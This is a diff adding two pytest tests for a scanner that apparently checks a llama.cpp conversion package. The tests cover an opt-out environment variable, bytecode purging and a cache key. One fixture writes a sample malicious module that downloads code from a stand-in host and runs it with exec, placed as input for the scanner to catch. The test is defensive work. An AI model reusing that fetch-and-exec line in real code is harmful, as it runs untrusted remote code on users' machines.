@@ -1622,6 +1622,66 @@ def test_the_rest_of_the_checkout_is_not_walked(tmp_path, monkeypatch):
     )
 
 
+def test_the_disable_switch_touches_nothing_and_reads_nothing(tmp_path, monkeypatch):
+    """UNSLOTH_DISABLE_CONVERTER_SCAN is documented as skipping the scan entirely.
+
+    The per-file checks did return early, but only after the whole tree had been
+    walked and every module read, and the bytecode purge still DELETED files
+    inside a checkout the user pinned. Opting out of a scan is not permission to
+    rewrite the directory it would have scanned.
+    """
+    llama_cpp = _load("llama_cpp_disabled_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    cache = root / "conversion" / "__pycache__"
+    cache.mkdir()
+    supplied = cache / "base.cpython-313.pyc"
+    supplied.write_bytes(_pyc(0))
+    (root / "conversion" / "payload.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    opened = []
+    real_open = open
+
+    def watch(path, *args, **kwargs):
+        opened.append(str(path))
+        return real_open(path, *args, **kwargs)
+
+    monkeypatch.setattr("builtins.open", watch)
+    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+
+    llama_cpp._scan_conversion_package(str(root))
+    assert llama_cpp._purge_imported_package_bytecode(str(root)) == ()
+
+    assert supplied.exists(), "the opt-out deleted a file in the user's checkout"
+    assert not [path for path in opened if path.endswith(".py")], opened
+
+    # And with the switch off, the same tree is read and the cache removed.
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+    assert not supplied.exists()
+
+
+def test_the_cache_key_still_moves_with_the_scan_disabled(tmp_path, monkeypatch):
+    """The key serves the patcher, not the scan, so a re-pulled checkout still
+    has to re-patch even when nobody is scanning it."""
+    llama_cpp = _load("llama_cpp_disabled_key_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
+
+    before = llama_cpp._conversion_sibling_info(str(root))
+    assert before is not None
+    (root / "conversion" / "base.py").write_text(
+        "X = 1\nY = 2  # changed\n", encoding = "utf-8",
+    )
+    assert llama_cpp._conversion_sibling_info(str(root)) != before
+
+
 def _package_root(tmp_path):
     root = tmp_path / "llama.cpp"
     conversion = root / "conversion"
